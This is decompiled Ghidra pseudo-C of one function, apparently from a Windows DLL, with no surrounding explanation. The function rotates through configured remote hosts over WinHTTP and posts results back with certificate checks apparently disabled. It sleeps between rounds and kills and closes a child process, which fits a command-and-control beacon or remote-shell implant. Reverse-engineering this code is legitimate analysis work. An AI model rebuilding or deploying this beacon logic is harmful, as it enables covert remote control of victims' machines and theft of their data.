// Function: FUN_180001e60
// Address: 180001e60


void FUN_180001e60(char *param_1)

{
  undefined8 *puVar1;
  char *pcVar2;
  longlong lVar3;
  int iVar4;
  undefined8 *puVar5;
  longlong lVar6;
  undefined8 uVar7;
  longlong lVar8;
  longlong lVar9;
  char *pcVar10;
  uint uVar11;
  uint local_res10 [2];
  uint local_res18 [2];
  undefined4 local_res20 [2];
  undefined8 in_stack_ffffffffffffff88;
  ulonglong uVar12;
  undefined4 uVar13;
  uint local_58;
  char *local_50;
  longlong local_48;
  longlong local_40;
  
  uVar11 = (uint)((ulonglong)in_stack_ffffffffffffff88 >> 0x20);
  puVar5 = FUN_1800027b0(param_1);
  if ((puVar5 == (undefined8 *)0x0) ||
     (local_40 = WinHttpOpen(&DAT_180003140,0,0,0,(ulonglong)uVar11 << 0x20), local_40 == 0)) {
    return;
  }
  local_50 = (char *)0x0;
  local_res10[0] = 0;
  local_48 = 0;
  local_res18[0] = 0;
  do {
    puVar1 = (undefined8 *)(puVar5[3] + (ulonglong)*(uint *)((longlong)puVar5 + 0x24) * 0x10);
    lVar6 = WinHttpConnect(local_40,*puVar1,puVar1[1] & 0xffff,0);
    if (lVar6 != 0) {
      uVar7 = FUN_1800021e0(lVar6,(char *)puVar5[5],(longlong *)&local_50,local_res10);
      iVar4 = (int)uVar7;
      while (iVar4 != 0) {
        uVar7 = FUN_180001560(puVar5,local_50,local_res10[0],&local_48,local_res18);
        local_res10[0] = 0;
        if ((int)uVar7 != 0) {
          if (local_50 != (char *)0x0) {
            FUN_180001350(&local_50);
          }
          lVar3 = local_48;
          pcVar2 = (char *)puVar5[5];
          uVar13 = 0;
          uVar12 = 0;
          lVar8 = WinHttpOpenRequest(lVar6,L"POST",0,0,0,0,0x800000);
          if (lVar8 == 0) break;
          lVar9 = FUN_180001430((longlong)pcVar2);
          pcVar10 = (char *)FUN_180001310((uint)lVar9 + 0x10);
          if (pcVar10 != (char *)0x0) {
            und_memcpy(pcVar10,(char *)L"Title: ",0xe);
            und_memcpy(pcVar10 + 0xe,pcVar2,(uint)lVar9);
            iVar4 = WinHttpAddRequestHeaders(lVar8,pcVar10,0xffffffff);
            if (iVar4 != 0) {
              local_res20[0] = 0x3300;
              iVar4 = WinHttpSetOption(lVar8,0x1f,local_res20);
              uVar11 = local_res18[0];
              if (iVar4 != 0) {
                iVar4 = WinHttpSendRequest(lVar8,0,0,0,uVar12 & 0xffffffff00000000,
                                           CONCAT44(uVar13,local_res18[0]),0);
                if (((iVar4 != 0) && (iVar4 = WinHttpWriteData(lVar8,lVar3,uVar11), iVar4 != 0)) &&
                   (WinHttpReceiveResponse(lVar8), local_58 == uVar11)) {
                  WinHttpCloseHandle();
                  goto LAB_18000208f;
                }
                WinHttpCloseHandle(lVar8);
                break;
              }
            }
          }
          WinHttpCloseHandle(lVar8);
          break;
        }
        if (local_50 != (char *)0x0) {
          FUN_180001350(&local_50);
        }
LAB_18000208f:
        local_res18[0] = 0;
        if (local_48 != 0) {
          FUN_180001350(&local_48);
        }
        Sleep(*(DWORD *)((longlong)puVar5 + 0xc));
        uVar7 = FUN_1800021e0(lVar6,(char *)puVar5[5],(longlong *)&local_50,local_res10);
        iVar4 = (int)uVar7;
      }
    }
    local_res10[0] = 0;
    if (local_50 != (char *)0x0) {
      FUN_180001350(&local_50);
    }
    local_res18[0] = 0;
    if (local_48 != 0) {
      FUN_180001350(&local_48);
    }
    if (lVar6 != 0) {
      WinHttpCloseHandle(lVar6);
    }
    puVar1 = (undefined8 *)puVar5[7];
    if ((longlong)puVar1[4] - 1U < 0xfffffffffffffffe) {
      TerminateProcess((HANDLE)puVar1[4],0);
    }
    FUN_1800013e0((longlong)(puVar1 + 4),0,0x18);
    if ((HANDLE)*puVar1 != (HANDLE)0xffffffffffffffff) {
      CloseHandle((HANDLE)*puVar1);
      *puVar1 = 0xffffffffffffffff;
    }
    if ((HANDLE)puVar1[1] != (HANDLE)0xffffffffffffffff) {
      CloseHandle((HANDLE)puVar1[1]);
      puVar1[1] = 0xffffffffffffffff;
    }
    if ((HANDLE)puVar1[3] != (HANDLE)0xffffffffffffffff) {
      CloseHandle((HANDLE)puVar1[3]);
      puVar1[3] = 0xffffffffffffffff;
    }
    if ((HANDLE)puVar1[2] != (HANDLE)0xffffffffffffffff) {
      CloseHandle((HANDLE)puVar1[2]);
      puVar1[2] = 0xffffffffffffffff;
    }
    uVar11 = (*(int *)((longlong)puVar5 + 0x24) + 1U) % *(uint *)(puVar5 + 4);
    *(undefined4 *)(puVar5 + 6) = 0;
    *(uint *)((longlong)puVar5 + 0x24) = uVar11;
    if (uVar11 == 0) {
      Sleep(*(DWORD *)(puVar5 + 1));
    }
  } while( true );
}

